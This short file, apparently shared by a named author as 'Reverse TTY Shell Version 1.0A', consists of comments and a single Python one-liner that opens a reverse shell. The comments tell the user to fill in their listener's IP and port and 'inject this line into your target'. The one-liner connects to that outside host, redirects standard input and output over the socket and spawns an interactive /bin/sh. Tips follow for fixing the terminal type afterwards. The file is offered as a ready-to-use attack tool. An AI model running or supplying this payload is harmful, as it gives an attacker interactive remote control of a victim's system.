# Reverse TTY Shell Version 1.0A By Darren Rainey
# Usage Replace YOUR_IP and YOUR_PORT with your listeners
# The inject this line into your target
# For certian programs like screen you may need to set your terminal after executing
# To do this run the command export TERM=vt100 after running the python code below

python -c 'import socket,subprocess,pty,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",YOUR_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn(["/bin/sh","-i"]);'
